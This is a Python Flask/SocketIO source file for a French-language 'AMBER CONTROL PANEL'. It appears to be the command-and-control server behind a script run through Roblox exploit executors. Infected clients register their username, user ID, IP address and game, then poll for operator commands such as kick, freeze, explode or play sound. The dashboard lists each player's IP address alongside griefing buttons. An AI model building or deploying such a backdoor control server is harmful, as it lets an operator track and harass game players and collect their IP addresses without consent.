from flask import Flask, request, jsonify, render_template_string, abort
from flask_socketio import SocketIO, emit
import time
import eventlet
from datetime import datetime

eventlet.monkey_patch()

app = Flask(__name__)
app.config["SECRET_KEY"] = "amber_ultra_v3"
socketio = SocketIO(app, cors_allowed_origins="*", async_mode="eventlet")

# --- CONFIGURATION ---
ALLOWED_IPS = {"37.66.149.36", "91.170.86.224"}
connected_players = {}
pending_commands = {}
history_logs = [] 

def add_to_history(action, p_data):
    log = {
        "id": str(time.time()),
        "time": datetime.now().strftime("%H:%M:%S"),
        "user": p_data.get("username", "Inconnu"),
        "userid": p_data.get("userid", "0"),
        "ip": p_data.get("ip", "0.0.0.0"),
        "executor": p_data.get("executor", "N/A"),
        "gameName": p_data.get("gameName", "Unknown Game"),
        "gameId": p_data.get("gameId", "0"),
        "action": action
    }
    history_logs.insert(0, log)
    if len(history_logs) > 100: history_logs.pop()
    socketio.emit("update_history", history_logs)

def check_ip():
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    if ip and "," in ip: ip = ip.split(",")[0].strip()
    if ip not in ALLOWED_IPS: abort(403)

# --- INTERFACE ---
HTML = """
<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<title>AMBER CONTROL PANEL V3</title>
<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Rajdhani:wght@400;600&display=swap" rel="stylesheet">
<style>
    :root {
        --bg: #050400;
        --card-bg: rgba(20, 18, 0, 0.95);
        --accent: #ffcc00;
        --accent-glow: rgba(255, 204, 0, 0.4);
        --danger: #ff3300;
    }

    * { box-sizing: border-box; margin: 0; padding: 0; }
    body { 
        font-family: 'Rajdhani', sans-serif; background: var(--bg); color: #fff; 
        background-image: radial-gradient(circle at 50% 0%, #221a00 0%, #050400 80%);
        min-height: 100vh; overflow-x: hidden;
    }

    .container { max-width: 1800px; margin: auto; padding: 15px; }
    header { text-align: center; margin-bottom: 25px; border-bottom: 1px solid var(--accent-glow); padding-bottom: 15px; }
    h1 { font-family: 'Orbitron'; font-size: 1.8rem; color: var(--accent); text-shadow: 0 0 15px var(--accent); letter-spacing: 5px; }

    .main-layout { display: grid; grid-template-columns: 1fr 400px; gap: 20px; }
    .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 15px; }

    .card { 
        background: var(--card-bg); border: 1px solid rgba(255, 204, 0, 0.1); 
        border-radius: 12px; padding: 15px; position: relative; transition: 0.3s;
        backdrop-filter: blur(10px);
    }
    .card:hover { border-color: var(--accent); box-shadow: 0 0 20px var(--accent-glow); }

    .status-badge { display: flex; align-items: center; font-size: 0.7rem; font-weight: bold; margin-bottom: 10px; color: var(--accent); }
    .dot { width: 7px; height: 7px; border-radius: 50%; margin-right: 6px; background: #333; }
    .dot.online { background: var(--accent); box-shadow: 0 0 10px var(--accent); }

    .name a { font-family: 'Orbitron'; font-size: 1.1rem; color: #fff; text-decoration: none; }
    .info-box { font-size: 0.8rem; color: #bbb; margin: 10px 0; line-height: 1.5; background: rgba(0,0,0,0.3); padding: 8px; border-radius: 6px; }
    .info-box b { color: var(--accent); }

    /* ANIMATIONS INPUTS */
    input[type="text"] {
        width: 100%; padding: 12px; background: #111; border: 1px solid #333; color: #fff; 
        margin: 15px 0; border-radius: 8px; font-family: 'Rajdhani'; transition: all 0.3s ease;
        outline: none;
    }
    input[type="text"]:focus {
        border-color: var(--accent);
        box-shadow: 0 0 15px var(--accent-glow);
        background: #1a1a00;
        transform: translateY(-2px);
    }

    .btn-group { display: grid; grid-template-columns: repeat(2, 1fr); gap: 8px; }
    .btn { padding: 10px; border: none; border-radius: 6px; cursor: pointer; font-weight: 700; font-family: 'Rajdhani'; font-size: 0.8rem; text-transform: uppercase; transition: 0.2s; }
    .btn-troll { background: rgba(255, 204, 0, 0.1); border: 1px solid var(--accent); color: var(--accent); }
    .btn-troll:hover { background: var(--accent); color: #000; box-shadow: 0 0 10px var(--accent); }
    .btn-kick { background: linear-gradient(45deg, #cc8800, #ffaa00); color: #000; font-weight: 800; }

    .history-panel { background: rgba(0,0,0,0.5); border: 1px solid #222; border-radius: 12px; padding: 15px; height: 85vh; display: flex; flex-direction: column; }
    .history-list { flex-grow: 1; overflow-y: auto; }
    .history-item { padding: 12px; border-bottom: 1px solid #1a1a1a; font-size: 0.8rem; animation: fadeIn 0.3s ease; }

    .modal { display: none; position: fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.85); z-index:1000; align-items:center; justify-content:center; backdrop-filter: blur(4px); }
    .modal.active { display: flex; }
    .modal-content { background: #0a0a0a; padding: 30px; border: 2px solid var(--accent); border-radius: 15px; width: 350px; text-align: center; box-shadow: 0 0 30px rgba(255,204,0,0.2); }

    @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
</style>
</head>
<body>
<div class="container">
    <header><h1>AMBER CONTROL PANEL</h1></header>
    <div class="main-layout">
        <section><div class="grid" id="players"></div></section>
        <aside>
            <div style="display:flex; justify-content:space-between; margin-bottom:10px; font-family:'Orbitron'; font-size:0.7rem;">
                <span style="color:var(--accent)">LOGS_HISTORIQUE</span>
                <button onclick="clearAllHistory()" style="background:none; border:none; color:var(--danger); cursor:pointer; font-weight:bold;">[ PURGE ]</button>
            </div>
            <div class="history-panel"><div class="history-list" id="history-list"></div></div>
        </aside>
    </div>
</div>

<div class="modal" id="kickModal"><div class="modal-content">
    <h2 style="color:var(--accent); font-family:'Orbitron'; font-size:1.2rem;">KICK_PLAYER</h2>
    <input type="text" id="kickReason" placeholder="Raison (ex: Test)...">
    <div style="display:flex; gap:10px">
        <button class="btn" style="flex:1; background:#222; color:#fff" onclick="closeModal('kickModal')">ANNULER</button>
        <button class="btn btn-kick" style="flex:1" id="confirmKickBtn">CONFIRMER</button>
    </div>
</div></div>

<div class="modal" id="soundModal"><div class="modal-content">
    <h2 style="color:var(--accent); font-family:'Orbitron'; font-size:1.2rem;">PLAY_AUDIO</h2>
    <input type="text" id="soundAssetId" placeholder="ID de l'asset...">
    <div style="display:flex; gap:10px">
        <button class="btn" style="flex:1; background:#222; color:#fff" onclick="closeModal('soundModal')">ANNULER</button>
        <button class="btn btn-troll" style="flex:1; background:var(--accent); color:#000" id="confirmSoundBtn">JOUER</button>
    </div>
</div></div>

<script>
const socket = io();
let selectedUid = null;

function openKickModal(uid) { selectedUid = uid; document.getElementById('kickModal').classList.add('active'); }
function openSoundModal(uid) { selectedUid = uid; document.getElementById('soundModal').classList.add('active'); }
function closeModal(id) { document.getElementById(id).classList.remove('active'); selectedUid = null; }

function sendTroll(uid, cmd, val = null) {
    fetch("/troll", {
        method: "POST", 
        headers: {"Content-Type": "application/json"}, 
        body: JSON.stringify({userid: uid, cmd: cmd, value: val})
    });
}

document.getElementById('confirmKickBtn').onclick = () => {
    const reasonValue = document.getElementById('kickReason').value || "Kicked by Admin";
    sendTroll(selectedUid, 'kick', reasonValue);
    closeModal('kickModal');
    document.getElementById('kickReason').value = "";
};

document.getElementById('confirmSoundBtn').onclick = () => {
    const assetId = document.getElementById('soundAssetId').value;
    sendTroll(selectedUid, 'playsound', assetId);
    closeModal('soundModal');
    document.getElementById('soundAssetId').value = "";
};

function clearAllHistory() { fetch("/clear_history", {method: "POST"}); }

socket.on("update", (data) => {
    const grid = document.getElementById("players");
    const currentIds = new Set(Object.keys(data.players));

    Object.entries(data.players).forEach(([id, p]) => {
        let card = document.getElementById(`card_${id}`);
        if (!card) {
            card = document.createElement("div"); card.className = "card"; card.id = `card_${id}`; grid.appendChild(card);
        }
        card.innerHTML = `
            <div class="status-badge"><div class="dot ${p.online ? 'online' : ''}"></div>${p.online ? 'SYNC_ACTIVE' : 'IDLE'}</div>
            <div class="name"><a href="https://www.roblox.com/fr/users/${id}/profile" target="_blank">${p.username}</a></div>
            <div class="info-box">
                IP: <b>${p.ip}</b> | EX: <b>${p.executor}</b><br>
                G: <a href="https://www.roblox.com/fr/games/${p.gameId}" target="_blank">${p.gameName}</a>
            </div>
            <div class="btn-group">
                <button class="btn btn-kick" onclick="openKickModal('${id}')">KICK</button>
                <button class="btn btn-troll" onclick="sendTroll('${id}','freeze')">FREEZE</button>
                <button class="btn btn-troll" onclick="sendTroll('${id}','spin')">SPIN</button>
                <button class="btn btn-troll" onclick="sendTroll('${id}','jump')">JUMP</button>
                <button class="btn btn-troll" onclick="sendTroll('${id}','rainbow')">RAINBOW</button>
                <button class="btn btn-troll" onclick="sendTroll('${id}','invisible')">INVISIBLE</button>
                <button class="btn btn-troll" onclick="sendTroll('${id}','explode')">EXPLODE</button>
                <button class="btn btn-troll" style="background:orange; color:#000; border:none" onclick="openSoundModal('${id}')">SOUND</button>
                <button class="btn btn-troll" style="grid-column: span 2; background:#333; border:1px solid #444; color:#888" onclick="sendTroll('${id}','unfreeze')">UNFREEZE / STOP ALL</button>
            </div>
        `;
    });
    document.querySelectorAll('.card').forEach(c => { if (!currentIds.has(c.id.replace('card_', ''))) c.remove(); });
});

socket.on("update_history", (logs) => {
    const list = document.getElementById("history-list");
    list.innerHTML = logs.map(log => `
        <div class="history-item">
            <span style="color:var(--accent); font-family:monospace">[${log.time}]</span> <b>${log.user}</b><br>
            <span style="color:#fff">${log.action}</span><br>
            <span style="font-size:0.7rem; color:#555">${log.ip} | ${log.executor}</span>
        </div>
    `).join('');
});
</script>
</body>
</html>
"""

# --- ROUTES PYTHON ---

@app.route("/")
def index():
    check_ip()
    return render_template_string(HTML)

@socketio.on('connect')
def handle_connect():
    emit("update_history", history_logs)

@app.route("/troll", methods=["POST"])
def troll():
    check_ip()
    d = request.get_json()
    uid, cmd, val = str(d["userid"]), d["cmd"], d.get("value")
    # Stockage de la commande avec sa valeur spécifique
    pending_commands[uid] = {"command": cmd, "value": val}
    p_data = connected_players.get(uid, {"username": "Unknown"})
    add_to_history(f"{cmd.upper()}: {val if val else 'N/A'}", p_data)
    return jsonify({"sent": True})

@app.route("/api", methods=["GET", "POST"])
def api():
    now = time.time()
    if request.method == "POST":
        d = request.get_json(silent=True) or {}
        uid = str(d.get("userid", ""))
        if d.get("action") == "register" and uid:
            d["userid"] = uid
            if uid not in connected_players: add_to_history("SYSTEM: JOINED", d)
            connected_players[uid] = {
                "username": d.get("username", "Unknown"),
                "ip": d.get("ip", "Unknown"),
                "gameName": d.get("gameName", "Click to View"),
                "gameId": d.get("gameId", "0"),
                "executor": d.get("executor", "Unknown"),
                "last": now, "online": True
            }
        elif d.get("action") == "heartbeat" and uid in connected_players:
            connected_players[uid]["last"] = now
        return jsonify({"ok": True})

    if request.method == "GET":
        uid = str(request.args.get("userid", ""))
        if uid in pending_commands:
            return jsonify(pending_commands.pop(uid))
        return jsonify({})

@app.route("/clear_history", methods=["POST"])
def clear_history():
    check_ip()
    global history_logs
    history_logs = [] # On vide la liste
    socketio.emit("update_history", history_logs)
    return jsonify({"ok": True})

def broadcast_loop():
    while True:
        now = time.time()
        to_remove = []
        for uid, p in connected_players.items():
            p["online"] = (now - p["last"] < 15)
            if now - p["last"] > 60: to_remove.append(uid)
        for uid in to_remove:
            add_to_history("SYSTEM: TIMEOUT", connected_players[uid])
            del connected_players[uid]
        socketio.emit("update", {"players": connected_players})
        socketio.sleep(2)

if __name__ == "__main__":
    socketio.start_background_task(broadcast_loop)
    socketio.run(app, host="0.0.0.0", port=5000)
